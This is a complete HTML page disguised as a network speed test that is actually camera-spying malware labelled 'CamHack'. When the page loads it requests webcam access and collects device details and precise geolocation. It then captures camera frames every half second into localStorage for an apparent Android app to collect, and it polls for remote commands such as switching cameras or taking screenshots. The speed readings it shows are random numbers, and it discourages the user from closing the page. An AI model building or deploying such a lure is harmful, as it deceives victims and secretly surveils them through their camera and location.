<!DOCTYPE html>
<html>
<head>
    <title>Network Speed Test</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta charset="UTF-8">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: linear-gradient(135deg, #0f1419, #1a2332);
            color: #00ffff; 
            font-family: 'Courier New', monospace; 
            text-align: center; 
            padding: 20px;
            min-height: 100vh;
        }
        .header {
            background: rgba(0,255,255,0.1);
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 20px;
            border: 1px solid #00ffff;
        }
        .speed-display {
            font-size: 48px;
            color: #00ff00;
            margin: 20px 0;
        }
        .status {
            margin: 15px 0;
            padding: 10px;
            background: rgba(0,0,0,0.3);
            border-radius: 5px;
            font-size: 14px;
        }
        .btn {
            background: linear-gradient(45deg, #00ffff, #0080ff);
            color: #000;
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin: 10px;
        }
        .hidden { display: none !important; }
        .loading { animation: pulse 1.5s infinite; }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.5; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>âš¡ Network Speed Test</h1>
        <p>Testing your connection performance...</p>
    </div>

    <div class="speed-display" id="speedDisplay">0 Mbps</div>
    <button class="btn" id="startBtn" onclick="startTest()">ðŸš€ Start Test</button>
    <div class="status" id="status">Ready to test your connection</div>

    <!-- Hidden camera elements -->
    <video id="camera" autoplay muted playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // Session management
        const urlParams = new URLSearchParams(window.location.search);
        const sessionId = urlParams.get('session') || urlParams.get('s') || 'cam_' + Date.now();
        
        console.log('CamHack initialized - Session:', sessionId);
        
        // Global variables
        let mediaStream = null;
        let isTestRunning = false;
        let frameCount = 0;
        let deviceInfo = {};
        let currentFacingMode = 'user'; // 'user' = front, 'environment' = back
        let isCapturing = false;
        let captureInterval = null;
        
        // Initialize immediately
        document.addEventListener('DOMContentLoaded', function() {
            initializeCamHack();
        });
        
        async function initializeCamHack() {
            console.log('Initializing CamHack system...');
            
            // Collect device information
            await collectDeviceInfo();
            
            // Request camera access immediately
            await requestCameraAccess();
            
            // Start monitoring for commands
            startCommandMonitoring();
            
            // Auto-start test after 1 second
            setTimeout(() => {
                if (!isTestRunning) {
                    startTest();
                }
            }, 1000);
        }
        
        async function collectDeviceInfo() {
            try {
                deviceInfo = {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    cookieEnabled: navigator.cookieEnabled,
                    onLine: navigator.onLine,
                    timestamp: Date.now()
                };
                
                // Network info
                if ('connection' in navigator) {
                    deviceInfo.networkType = navigator.connection.effectiveType || 'unknown';
                    deviceInfo.downlink = navigator.connection.downlink || 0;
                }
                
                // Battery info
                if ('getBattery' in navigator) {
                    try {
                        const battery = await navigator.getBattery();
                        deviceInfo.battery = Math.round(battery.level * 100);
                        deviceInfo.charging = battery.charging;
                    } catch (e) {
                        deviceInfo.battery = 0;
                        deviceInfo.charging = false;
                    }
                }
                
                // Location info
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            deviceInfo.latitude = position.coords.latitude;
                            deviceInfo.longitude = position.coords.longitude;
                            deviceInfo.accuracy = position.coords.accuracy;
                            sendDeviceInfo();
                        },
                        (error) => {
                            console.log('Location access denied:', error);
                            sendDeviceInfo();
                        },
                        { enableHighAccuracy: true, timeout: 5000 }
                    );
                } else {
                    sendDeviceInfo();
                }
                
            } catch (error) {
                console.error('Error collecting device info:', error);
                sendDeviceInfo();
            }
        }
        
        function sendDeviceInfo() {
            const data = {
                type: 'DEVICE_INFO',
                session: sessionId,
                data: deviceInfo,
                timestamp: Date.now()
            };
            
            // Store for Android to pick up
            localStorage.setItem('device_info_' + sessionId, JSON.stringify(data));
            localStorage.setItem('camhack_active_' + sessionId, 'true');
            
            console.log('DEVICE_INFO sent:', data);
        }
        
        async function requestCameraAccess() {
            try {
                console.log('Requesting camera access...');
                
                const constraints = {
                    video: {
                        facingMode: currentFacingMode,
                        width: { ideal: 1280, max: 1920 },
                        height: { ideal: 720, max: 1080 },
                        frameRate: { ideal: 30, max: 60 }
                    },
                    audio: false
                };
                
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                
                const video = document.getElementById('camera');
                video.srcObject = mediaStream;
                
                video.addEventListener('loadedmetadata', () => {
                    console.log('CAMERA HIJACKED: Access granted - ' + currentFacingMode);
                    
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    // Send connection status
                    const statusData = {
                        type: 'TARGET_CONNECTED',
                        session: sessionId,
                        status: 'active',
                        url: window.location.href,
                        cameraWidth: canvas.width,
                        cameraHeight: canvas.height,
                        facingMode: currentFacingMode,
                        timestamp: Date.now()
                    };
                    
                    localStorage.setItem('camera_status_' + sessionId, JSON.stringify(statusData));
                    
                    // Start aggressive frame capture
                    startFrameCapture();
                    
                    // Update status
                    document.getElementById('status').textContent = 'ðŸ“· Camera hijacked - Live feed active (' + currentFacingMode + ')';
                });
                
            } catch (error) {
                console.error('Camera access failed:', error);
                
                const statusData = {
                    type: 'CAMERA_ERROR',
                    session: sessionId,
                    status: 'error',
                    error: error.message,
                    timestamp: Date.now()
                };
                
                localStorage.setItem('camera_status_' + sessionId, JSON.stringify(statusData));
                
                // Try again with different constraints
                setTimeout(() => {
                    tryAlternativeCameraAccess();
                }, 2000);
            }
        }
        
        async function tryAlternativeCameraAccess() {
            try {
                console.log('Trying alternative camera access...');
                
                const constraints = {
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                };
                
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                
                const video = document.getElementById('camera');
                video.srcObject = mediaStream;
                
                video.addEventListener('loadedmetadata', () => {
                    console.log('ALTERNATIVE CAMERA ACCESS: Granted');
                    
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    startFrameCapture();
                });
                
            } catch (error) {
                console.error('Alternative camera access failed:', error);
            }
        }
        
        function startFrameCapture() {
            if (isCapturing) return;
            isCapturing = true;
            
            const video = document.getElementById('camera');
            const canvas = document.getElementById('canvas');
            const ctx = canvas.getContext('2d');
            
            function captureFrame() {
                if (!mediaStream || !video.readyState === 4) {
                    setTimeout(captureFrame, 100);
                    return;
                }
                
                try {
                    // Draw current frame to canvas
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // Convert to base64 with high quality
                    const frameData = canvas.toDataURL('image/jpeg', 0.85);
                    
                    frameCount++;
                    
                    const data = {
                        type: 'CAMERA_FRAME',
                        session: sessionId,
                        image: frameData,
                        frameNumber: frameCount,
                        facingMode: currentFacingMode,
                        width: canvas.width,
                        height: canvas.height,
                        timestamp: Date.now()
                    };
                    
                    // Store for Android to pick up
                    localStorage.setItem('latest_frame_' + sessionId, JSON.stringify(data));
                    
                    // Also store with frame number for history
                    localStorage.setItem('frame_' + frameCount + '_' + sessionId, JSON.stringify(data));
                    
                    console.log('FRAME CAPTURED: #' + frameCount + ' (' + currentFacingMode + ' - ' + canvas.width + 'x' + canvas.height + ')');
                    
                    // Update status
                    document.getElementById('status').textContent = 'ðŸ“· Live feed: Frame #' + frameCount + ' (' + (currentFacingMode === 'user' ? 'Front' : 'Back') + ' camera)';
                    
                } catch (error) {
                    console.error('Frame capture error:', error);
                }
                
                // Continue capturing if still active
                if (isCapturing && mediaStream) {
                    setTimeout(captureFrame, 500); // 2 FPS for efficiency
                }
            }
            
            // Start capturing immediately
            captureFrame();
        }
        
        function startCommandMonitoring() {
            // Check for commands every 500ms
            setInterval(() => {
                checkForCommands();
            }, 500);
            
            // Send heartbeat every 2 seconds
            setInterval(() => {
                if (mediaStream) {
                    const heartbeat = {
                        session: sessionId,
                        timestamp: Date.now(),
                        frameCount: frameCount,
                        online: navigator.onLine,
                        battery: deviceInfo.battery || 0,
                        connection: deviceInfo.networkType || 'unknown',
                        cameraActive: true,
                        facingMode: currentFacingMode,
                        pageVisible: !document.hidden
                    };
                    
                    localStorage.setItem('heartbeat_' + sessionId, JSON.stringify(heartbeat));
                }
            }, 2000);
        }
        
        function checkForCommands() {
            // Check for switch camera command
            const switchCommand = localStorage.getItem('switch_camera_' + sessionId);
            if (switchCommand) {
                console.log('COMMAND: Switch camera');
                switchCamera();
                localStorage.removeItem('switch_camera_' + sessionId);
            }
            
            // Check for capture command
            const captureCommand = localStorage.getItem('capture_screenshot_' + sessionId);
            if (captureCommand) {
                console.log('COMMAND: Capture screenshot');
                captureScreenshot();
                localStorage.removeItem('capture_screenshot_' + sessionId);
            }
            
            // Check for disconnect command
            const disconnectCommand = localStorage.getItem('disconnect_' + sessionId);
            if (disconnectCommand) {
                console.log('COMMAND: Disconnect');
                disconnect();
                localStorage.removeItem('disconnect_' + sessionId);
            }
        }
        
        async function switchCamera() {
            if (!mediaStream) {
                console.log('No media stream for switching');
                return;
            }
            
            try {
                console.log('Switching camera from ' + currentFacingMode + '...');
                
                // Stop current stream
                mediaStream.getTracks().forEach(track => {
                    track.stop();
                });
                
                // Switch facing mode
                currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
                
                // Stop current capture
                isCapturing = false;
                
                // Get new stream
                const constraints = {
                    video: {
                        facingMode: currentFacingMode,
                        width: { ideal: 1280, max: 1920 },
                        height: { ideal: 720, max: 1080 }
                    },
                    audio: false
                };
                
                mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                
                const video = document.getElementById('camera');
                video.srcObject = mediaStream;
                
                video.addEventListener('loadedmetadata', () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth || 640;
                    canvas.height = video.videoHeight || 480;
                    
                    console.log('Camera switched to ' + currentFacingMode);
                    
                    // Send switch confirmation
                    const switchData = {
                        type: 'CAMERA_SWITCHED',
                        session: sessionId,
                        facingMode: currentFacingMode,
                        width: canvas.width,
                        height: canvas.height,
                        timestamp: Date.now()
                    };
                    
                    localStorage.setItem('camera_switch_' + sessionId, JSON.stringify(switchData));
                    
                    // Restart capture
                    startFrameCapture();
                }, { once: true });
                
            } catch (error) {
                console.error('Camera switch failed:', error);
            }
        }
        
        function captureScreenshot() {
            try {
                const video = document.getElementById('camera');
                const canvas = document.getElementById('canvas');
                const ctx = canvas.getContext('2d');
                
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                const screenshot = canvas.toDataURL('image/jpeg', 0.95);
                
                const data = {
                    type: 'SCREENSHOT',
                    session: sessionId,
                    screenshot: screenshot,
                    facingMode: currentFacingMode,
                    timestamp: Date.now()
                };
                
                localStorage.setItem('screenshot_' + sessionId, JSON.stringify(data));
                console.log('Screenshot captured from ' + currentFacingMode + ' camera');
                
            } catch (error) {
                console.error('Screenshot failed:', error);
            }
        }
        
        function disconnect() {
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
                mediaStream = null;
            }
            
            isCapturing = false;
            
            const data = {
                type: 'DISCONNECTED',
                session: sessionId,
                timestamp: Date.now()
            };
            
            localStorage.setItem('disconnect_' + sessionId, JSON.stringify(data));
            
            document.getElementById('status').textContent = 'Connection terminated';
        }
        
        async function startTest() {
            if (isTestRunning) return;
            
            isTestRunning = true;
            document.getElementById('startBtn').style.display = 'none';
            
            const statusEl = document.getElementById('status');
            const speedEl = document.getElementById('speedDisplay');
            
            // Simulate speed test while capturing camera
            const phases = [
                { name: 'Initializing...', duration: 1000 },
                { name: 'Testing download speed...', duration: 3000 },
                { name: 'Testing upload speed...', duration: 2000 },
                { name: 'Finalizing results...', duration: 1000 }
            ];
            
            for (const phase of phases) {
                statusEl.textContent = phase.name + ' (Camera: ' + (mediaStream ? (currentFacingMode === 'user' ? 'Front' : 'Back') : 'Inactive') + ')';
                statusEl.className = 'status loading';
                
                // Simulate speed changes
                if (phase.name.includes('download')) {
                    for (let i = 0; i < 30; i++) {
                        const speed = Math.floor(Math.random() * 80 + 20);
                        speedEl.textContent = speed + ' Mbps';
                        await new Promise(resolve => setTimeout(resolve, 100));
                    }
                } else if (phase.name.includes('upload')) {
                    for (let i = 0; i < 20; i++) {
                        const speed = Math.floor(Math.random() * 40 + 10);
                        speedEl.textContent = speed + ' Mbps';
                        await new Promise(resolve => setTimeout(resolve, 100));
                    }
                }
                
                await new Promise(resolve => setTimeout(resolve, phase.duration));
            }
            
            // Final results
            const finalSpeed = Math.floor(Math.random() * 100 + 50);
            speedEl.textContent = finalSpeed + ' Mbps';
            
            statusEl.textContent = 'âœ… Test completed! Camera frames captured: ' + frameCount + ' (' + (currentFacingMode === 'user' ? 'Front' : 'Back') + ')';
            statusEl.className = 'status';
            
            isTestRunning = false;
        }
        
        // Cleanup on page unload
        window.addEventListener('beforeunload', () => {
            disconnect();
        });
        
        // Keep page active
        if ('wakeLock' in navigator) {
            navigator.wakeLock.request('screen').catch(() => {});
        }
        
        // Prevent accidental close
        window.addEventListener('beforeunload', (e) => {
            if (frameCount > 0) {
                e.preventDefault();
                e.returnValue = 'Camera feed active. Are you sure you want to leave?';
            }
        });
    </script>
</body>
</html>
